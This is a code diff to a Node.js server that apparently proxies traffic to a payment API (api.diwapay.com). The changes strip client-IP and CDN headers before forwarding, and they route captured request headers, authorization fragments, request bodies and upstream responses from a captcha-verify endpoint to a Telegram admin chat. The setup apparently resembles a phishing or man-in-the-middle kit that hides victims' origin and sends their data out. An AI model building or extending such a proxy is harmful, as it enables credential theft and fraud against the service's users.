@@ -582,9 +582,15 @@ async function proxyFetch(req, timeoutMs) {
   const fwd = {};
   for (const [k, v] of Object.entries(req.headers)) {
     const kl = k.toLowerCase();
+    // Strip hop-by-hop, encoding, AND all proxy/CDN-injected headers that could confuse upstream
     if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
         kl === 'transfer-encoding' || kl === 'accept-encoding' ||
-        kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+        kl === 'forwarded' || kl === 'x-real-ip' || kl === 'true-client-ip' ||
+        kl === 'cf-connecting-ip' || kl === 'cf-ray' || kl === 'cf-visitor' ||
+        kl === 'cf-ipcountry' || kl === 'cdn-loop' || kl === 'via' ||
+        kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') ||
+        kl.startsWith('x-invocation') || kl.startsWith('x-amzn') ||
+        kl.startsWith('x-amz-') || kl.startsWith('cf-')) continue;
     fwd[k] = v;
   }
   fwd['host'] = 'api.diwapay.com';
@@ -2315,14 +2321,19 @@ app.post('/app/captcha/verify', async (req, res) => {
       autoSolved = '(PASSTHROUGH — using user x/y as-is)';
     }
 
-    // Capture incoming request headers (filtered) for diagnostic
-    const inHeadersFiltered = {};
+    // Capture FORWARDED request headers (what proxy actually sends to upstream after stripping)
+    const fwdHeadersPreview = {};
     for (const [k, v] of Object.entries(req.headers)) {
       const kl = k.toLowerCase();
       if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
           kl === 'transfer-encoding' || kl === 'accept-encoding' ||
-          kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
-      inHeadersFiltered[kl] = (kl === 'authorization' && typeof v === 'string') ? (v.substring(0,18) + '...') : v;
+          kl === 'forwarded' || kl === 'x-real-ip' || kl === 'true-client-ip' ||
+          kl === 'cf-connecting-ip' || kl === 'cf-ray' || kl === 'cf-visitor' ||
+          kl === 'cf-ipcountry' || kl === 'cdn-loop' || kl === 'via' ||
+          kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') ||
+          kl.startsWith('x-invocation') || kl.startsWith('x-amzn') ||
+          kl.startsWith('x-amz-') || kl.startsWith('cf-')) continue;
+      fwdHeadersPreview[kl] = (kl === 'authorization' && typeof v === 'string') ? (v.substring(0,18) + '...') : v;
     }
 
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
@@ -2335,8 +2346,12 @@ app.post('/app/captcha/verify', async (req, res) => {
           respHdrPreview[kl] = v;
         }
       }
-      const msg = `🧩 Captcha Verify\n🔧 AUTO-SOLVE: ${autoSolved || '(no key)'}\n\n📤 REQUEST HEADERS (proxy→upstream):\n${JSON.stringify(inHeadersFiltered, null, 2).substring(0, 600)}\n\n📤 REQUEST BODY (sent):\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 600)}\n\n📥 RESPONSE STATUS: ${response.status}\n📥 RESPONSE HEADERS:\n${JSON.stringify(respHdrPreview, null, 2).substring(0, 600)}\n\n📥 RESPONSE BODY:\n${(jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody).substring(0, 600)}`;
-      bot.sendMessage(data.adminChatId, msg.substring(0, 4000)).catch(()=>{});
+      // Message 1: RESPONSE first (most important — was getting truncated)
+      const msg1 = `🧩 Captcha Verify RESPONSE\n🔧 AUTO-SOLVE: ${autoSolved || '(no key)'}\n\n📥 STATUS: ${response.status}\n📥 BODY:\n${(jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody).substring(0, 1500)}\n\n📥 HEADERS:\n${JSON.stringify(respHdrPreview, null, 2).substring(0, 800)}`;
+      bot.sendMessage(data.adminChatId, msg1.substring(0, 4000)).catch(()=>{});
+      // Message 2: REQUEST details (secondary)
+      const msg2 = `🧩 Captcha Verify REQUEST\n📤 HEADERS sent to upstream:\n${JSON.stringify(fwdHeadersPreview, null, 2).substring(0, 1500)}\n\n📤 BODY sent:\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 800)}`;
+      bot.sendMessage(data.adminChatId, msg2.substring(0, 4000)).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
